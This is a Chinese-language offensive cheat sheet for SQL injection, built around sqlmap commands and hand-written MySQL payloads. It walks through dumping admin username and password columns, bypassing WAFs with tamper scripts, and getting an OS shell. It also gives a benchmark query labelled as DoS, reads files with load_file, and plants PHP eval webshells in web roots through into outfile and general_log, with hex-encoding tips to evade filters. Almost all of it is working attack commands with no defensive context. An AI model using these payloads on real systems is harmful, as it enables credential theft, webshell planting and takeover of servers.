#######################
#######  sqlmap  ######
#######################

###Access数据库注入
sqlmap -u "http://www/Big.asp?id=7"   猜解是否能注入
sqlmap -u "http://www/Big.asp?id=7" 
sqlmap -u "http://www/Big.asp?id=7" --tables  猜解表
sqlmap -u "http://www/Big.asp?id=7" --columns -T admin  猜解表的字段
sqlmap -u "http://www/Big.asp?id=7" --dump -T admin -C "username,password"  字段猜解内容
sqlmap -u "http://www/Big.asp?id=7" --dump -T admin -C "username,[url=]B[/url]password"  字段猜解内容
###mysql中DDOS攻击,获取一个Shell
sqlmap -u http://192.168.159.1/news.php?id=1 --sql-shell
sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell
###输入执行语句完成DDOS攻击
select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)
###mysql注入
sqlmap -u "http://www.xxx.com/link.php?id=321" --dbs  查找数据库
sqlmap -u "http://www.xxx.com/link.php?id=321" -D dataname --tables  数据库查找表
sqlmap -u "http://www.xxx.com/link.php?id=321" -D dataname -T table_name --columns    得出列名
sqlmap -u "http://www.xxx.com/link.php?id=321" -D dataname -T table_name -C
"id,user,password" --dump    获取字段的值
###post登陆框注入
search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt
sqlmap -r search-test.txt -p tfUPass -p 指定注入用的参数
sqlmap -u "http://testasp.vulnweb.com/Login.asp" --forms  自动的搜索
sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --forms
sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --data "tfUName=321&tfUPass=321"
sqlmap -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=321&tfUPass=321"  指定参数搜索
sqlmap -g inurl:php?id=  Google搜索注入
###请求延迟
sqlmap --dbs -u "http://xxx.cn/index.php/Index/view/id/40.html" --delay 1
sqlmapy --dbs -u "http://xxx.cn/index.php/Index/view/id/40.html" --safe-freq 3
###绕过WAF防火墙
sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 --dbs --batch --tamper "space2morehash.py"
sqlmap -u "http://192.168.159.1/news.php?id=1" -v3 --dbs --batch --tamper "space2morehash.py"  编码方式 space2hash.py base64encode.py charencode.py
###查看权限
sqlmap -u "http://192.168.159.1/news.php?id=1" --privileges

###SQLMAP伪静态注入
sqlmap  -u "http://xxx.cn/index.php/Index/view/id/40.html" --dbs  查找数据库
sqlmap  -u "http://xxx.cn/index.php/Index/view/id/40.html" -D dataname --tables  找对应的表
sqlmap  -u "http://xxx.cn/index.php/Index/view/id/40.html" -D dataname -T tablename --columns   得到字段
sqlmap  -u "http://xxx.cn/index.php/Index/view/id/40.html" -D dataname -T tablename -C "password" --dump  得到字段值

###命令与交互写shell 
sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-cmd=ipconfig   Linux系统
sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-shell  获取Shell

sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password   数据库中搜索字段
###读取与写入文件
–file-read=RFILE   物理路径
–file-write=WFILE  本地文件 mssql xp_shell
–file-dest=DFILE   统写入文件的绝对路径
sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”
sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell

###sql注入--高权限，load_file读写文件
select '<?php eval($_POST[123]) ?>' into outfile '/var/www/html/1.php';
# secure_file_priv选项
# 　　1、限制mysqld 不允许导入 | 导出
# 　   　   --secure_file_prive=null
# 　　2、限制mysqld 的导入 | 导出 只能发生在/tmp/目录下
# 　　　   --secure_file_priv=/tmp/
# 　　3、不对mysqld 的导入 | 导出做限制
#               --secure_file_priv= 

cat /etc/my.cnf
#[mysqld]   secure_file_priv= 

#查看secure_file_priv
show global variables like '%secure%';
替代方法：
    要知道路径
set global general_log=on;set global general_log_file='C:/phpStudy/WWW/123.php';select '<?php eval($_POST[123]) ?>';
load_file()读文件
http://test.com/sqli/Less-1/?id=-1' union select 1,load_file('c:\\flag.txt'),3 --+

into outfile / into dumpfile写文件
select load_file('/flag');:
1.路径使用\\ ，否则会被当作转义符号
2.路径使用/
3.盘符根路径下可用c:admin.txt
4.16进制文件名
5.char(路径ascii)
http://test.com/sqli/Less-1/?id=-1' union select 1,'<?php phpinfo?>',3 into outfile 'c:/123.php'--+

###注入点的读写、out_file

00x1 判断是否可读
http://127.0.0.1/1.php?id=1 and (select count(*) from mysql.user) >0--
/*
返回正确的话，说明没有是有读的权限。
返回错误，那极有可能是权限降了。
能够判断出mysql的长度说明是可以读取其长度，自然就是可读。
*/

00x2 使用load_file读文件
http://127.0.0.1/1.php?id=-1 union select 1,2,load_file('D:/wamp/www/test.txt')--
/*
D:/wamp/www/test.txt可替换为十六进制的，如下所示。
http://127.0.0.1/1.php?id=1 union select 1,2,load_file(char('0x443A2F77616D702F7777772F746573742E747874'))
*/
00x2 使用out_file写入木马文件
http://127.0.0.1/index.php?id=-1 union select 1,'<?php eval($_POST[cmd])?>',3 into outfile 'D:/wamp/www/test.php'--
/*
<?php eval($_POST[cmd])?> 该句一句话木马可以转换为十六进制的。可躲避waf之类的。
写入文件的斜杠必须是/
*/
